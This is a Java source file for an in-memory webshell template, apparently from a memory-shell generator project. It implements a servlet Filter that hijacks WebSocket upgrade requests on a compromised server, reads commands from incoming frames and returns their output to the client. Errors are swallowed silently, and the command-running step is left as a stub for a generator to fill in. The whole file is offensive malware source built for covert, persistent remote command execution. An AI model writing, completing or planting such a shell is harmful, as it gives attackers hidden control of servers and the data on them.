package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;

/**
 * 不依赖容器 WebSocket 实现的命令执行内存马。
 * <p>
 * 握手与帧协议由注入器内置的 {@code <shellClassName>$RawWsHelper} 接管连接器 socket
 * 完成；本类只处理业务消息，通过 {@code helper.equals(new Object[]{request, response, this})}
 * 把控制权交给 helper，由 helper 回调 onStart/onReadBinary/onReadText/onDisconnect。
 *
 * @author ReaJason
 */
public class CommandRawWebSocket implements Filter {

    // 仅用于 onReadBinary 入站命令解码：线路协议固定 UTF-8。子进程输出按平台默认 charset 解码
    private static final Charset UTF8 = Charset.forName("UTF-8");

    private static Method sendTextMethod;

    private final Class<?> helperClass;

    public CommandRawWebSocket() {
        this(resolveHelperClass(CommandRawWebSocket.class));
    }

    public CommandRawWebSocket(Class<?> helperClass) {
        this.helperClass = helperClass;
    }

    /**
     * 后缀必须与 RawWsHelperNames.HELPER_SUFFIX 一致；模板运行时不能依赖 api jar。
     */
    private static Class<?> resolveHelperClass(Class<?> shellClass) {
        try {
            return Class.forName(shellClass.getName() + "$RawWsHelper", false, shellClass.getClassLoader());
        } catch (Throwable ignored) {
            return null;
        }
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (!(request instanceof HttpServletRequest) || !(response instanceof HttpServletResponse)) {
            chain.doFilter(request, response);
            return;
        }
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String wsKey = httpRequest.getHeader("Sec-WebSocket-Key");
        if (wsKey == null || !"GET".equalsIgnoreCase(httpRequest.getMethod())) {
            chain.doFilter(request, response);
            return;
        }
        String version = httpRequest.getHeader("Sec-WebSocket-Version");
        if (version != null && !"13".equals(version.trim())) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(426);
            httpResponse.setHeader("Sec-WebSocket-Version", "13");
            return;
        }
        if (helperClass != null) {
            try {
                Object helper = helperClass.newInstance();
                if (helper.equals(new Object[]{request, response, this})) {
                    return;
                }
            } catch (Throwable ignored) {
            }
        }
        chain.doFilter(request, response);
    }

    public void onStart(Object helper) {
    }

    public void onReadBinary(Object helper, byte[] data) {
        onReadText(helper, new String(data, UTF8));
    }

    public void onReadText(Object helper, String cmd) {
        try {
            InputStream inputStream = getInputStream(getParam(cmd));
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int count;
            while ((count = inputStream.read(buffer)) != -1) {
                out.write(buffer, 0, count);
            }
            sendText(helper, new String(out.toByteArray()));
        } catch (Throwable ignored) {
        }
    }

    public void onDisconnect(Object helper) {
    }

    private static void sendText(Object helper, String text) {
        try {
            Method method = sendTextMethod;
            if (method == null) {
                method = helper.getClass().getMethod("sendText", String.class);
                sendTextMethod = method;
            }
            method.invoke(helper, text);
        } catch (Throwable ignored) {
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
